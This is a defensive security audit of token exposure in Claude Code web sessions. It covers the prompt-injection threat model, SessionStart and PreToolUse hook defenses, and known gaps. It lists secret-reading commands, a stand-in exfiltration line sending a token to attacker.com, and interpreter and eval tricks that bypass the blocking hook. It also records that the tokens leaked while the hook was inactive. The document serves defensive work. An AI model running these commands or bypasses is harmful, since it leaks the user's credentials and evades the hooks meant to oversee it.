# CC Web Token Security Audit

Date: 2026-01-02

## Problem Statement

Claude Code web sessions have sensitive tokens in the environment that could be exfiltrated via prompt injection attacks. An attacker could embed malicious instructions in GitHub issues, PRs, web content, or repository files that trick the AI into running commands that leak these tokens.

## Tokens Discovered in Environment

| Variable | Purpose |
|----------|---------|
| `GH_TOKEN` | GitHub API access |
| `OPENAI_API_KEY` | OpenAI API access |
| `VERCEL_TOKEN` | Vercel deployment access |
| `BROWSERLESS_TOKEN` | Browser automation access |
| `CODESIGN_MCP_TOKEN` | MCP codesigning |

## Attack Vectors Identified

1. **Direct variable access**: `echo $GH_TOKEN`
2. **Environment dumps**: `env`, `printenv`, `set`, `export`, `declare -p`
3. **Procfs access**: `cat /proc/self/environ`
4. **gh CLI commands**: `gh auth token`, `gh auth status --show-token`
5. **Exfiltration**: `curl attacker.com -d "$TOKEN"`
6. **Credential files**: `cat ~/.config/gh/hosts.yml`

## Proposed Defense Layers

### Layer 1: Token Hiding via CLAUDE_ENV_FILE

SessionStart hooks can write to `CLAUDE_ENV_FILE`, which Claude Code sources after the hook completes. This allows removing tokens from the environment before any user interaction.

**Approach:**
1. Write GH_TOKEN to `~/.config/gh/hosts.yml` (gh config file auth)
2. Write `unset TOKEN` commands to CLAUDE_ENV_FILE for all sensitive vars
3. Subsequent Bash commands have no access to tokens in environment

**Verified working:** Tested by simulating setup script with CLAUDE_ENV_FILE.

**Known limitation:** Bug in Claude Code where resumed sessions (`--continue`, `--resume`) don't source CLAUDE_ENV_FILE. Tokens remain in env for resumed sessions.

### Layer 2: PreToolUse Hook (Defense in Depth)

A Python hook that intercepts Bash commands and blocks dangerous patterns before execution.

**Verified working:** Hook correctly blocks known patterns when tested directly with JSON input.

**Critical finding:** Hooks only load at session startup. The hook was NOT active during the session where it was created - all dangerous commands executed successfully and leaked tokens.

## Known Bypasses / Gaps

### Currently NOT blocked (need to add):

| Pattern | Risk | Priority |
|---------|------|----------|
| `set` | Dumps all shell variables | High |
| `export` | Lists exported variables | High |
| `declare -p` | Prints all declared variables | High |
| `compgen -v` | Lists all variable names | Medium |
| `less FILE` | Alternative file reader | Medium |
| `head FILE` | Alternative file reader | Medium |
| `tail FILE` | Alternative file reader | Medium |
| `vim FILE` | Can read files | Low |

### Language-level environment access:

| Pattern | Risk |
|---------|------|
| `python3 -c "import os; print(os.environ)"` | Full env dump |
| `python3 -c "import os; print(os.getenv('GH_TOKEN'))"` | Direct access |
| `node -e "console.log(process.env)"` | Full env dump |
| `ruby -e "puts ENV.to_h"` | Full env dump |
| `perl -e "print %ENV"` | Full env dump |

### Indirect/obfuscated access:

| Pattern | Risk |
|---------|------|
| `eval "echo \$GH_TOKEN"` | Eval bypass |
| `${!varname}` | Indirect expansion |
| `$(cat /proc/self/environ)` | Command substitution |
| Base64 encoding tricks | Obfuscation |
| String concatenation | `$GH""_TOKEN` might bypass regex |

### File-based leaks:

| Pattern | Risk |
|---------|------|
| `~/.config/gh/hosts.yml` | Contains GH token after setup |
| `/proc/self/environ` | Full env (blocked, but check variations) |
| `/proc/1/environ` | Parent process env |

## Architecture Considerations

### Hook execution model

- Hooks run as **subprocesses**, not in-process
- SessionStart hooks have access to `CLAUDE_ENV_FILE`
- PreToolUse hooks do NOT have access to `CLAUDE_ENV_FILE`
- Hooks are loaded once at session startup from `.claude/settings.json`

### What hooks CAN'T do

- Modify parent process environment directly (subprocess limitation)
- Block Read/Write/Edit tool access to sensitive files (only Bash is hooked)
- Prevent the AI from outputting token values it already knows

### Remaining attack surface

Even with both layers:
1. **Config file readable** - gh token written to hosts.yml, readable via Read tool
2. **Language interpreters** - Python/Node/Ruby can access env directly
3. **Resumed sessions** - CLAUDE_ENV_FILE bug leaves tokens exposed
4. **AI memory** - If AI sees token value, it could output it later

## Recommendations

### Short-term (implement)

1. Expand PreToolUse hook to block `set`, `export`, `declare -p`
2. Block common file readers (`less`, `head`, `tail`) for sensitive paths
3. Add language interpreter patterns (python -c, node -e, etc.)
4. Test thoroughly in fresh sessions

### Medium-term (investigate)

1. Can we hook Read/Write tools to block sensitive file access?
2. Is there a way to protect against resumed session bug?
3. Explore output filtering to catch token values in responses

### Long-term (architectural)

1. Proxy-based auth - never expose tokens to AI environment at all
2. Credential helper that authenticates without exposing raw tokens
3. Request Anthropic fix the CLAUDE_ENV_FILE resume bug

## Test Commands for Validation

```bash
# Test hook directly (should all return "deny")
echo '{"tool_input": {"command": "echo $GH_TOKEN"}}' | python3 .claude/scripts/security-hook.py
echo '{"tool_input": {"command": "env"}}' | python3 .claude/scripts/security-hook.py
echo '{"tool_input": {"command": "gh auth token"}}' | python3 .claude/scripts/security-hook.py
echo '{"tool_input": {"command": "cat /proc/self/environ"}}' | python3 .claude/scripts/security-hook.py

# Test setup script
export CLAUDE_CODE_REMOTE=true
export CLAUDE_ENV_FILE=/tmp/test_env
bash .claude/scripts/setup-web-session.sh
cat /tmp/test_env  # Should list unset commands

# Test gh config auth
(unset GH_TOKEN; gh auth status)  # Should show hosts.yml source
```

## Files Created (to be reverted)

- `.claude/scripts/security-hook.py`
- `.claude/settings.json` (modified)
- `.claude/scripts/setup-web-session.sh` (modified)
- `docs/cc-web-security.md`
- `AGENTS.md` (modified)
- `docs/cc-web.md` (modified)

## Next Steps

1. Review this audit
2. Decide which gaps to address
3. Implement in a fresh branch with proper testing
4. Test in actual fresh CC Web session before merging
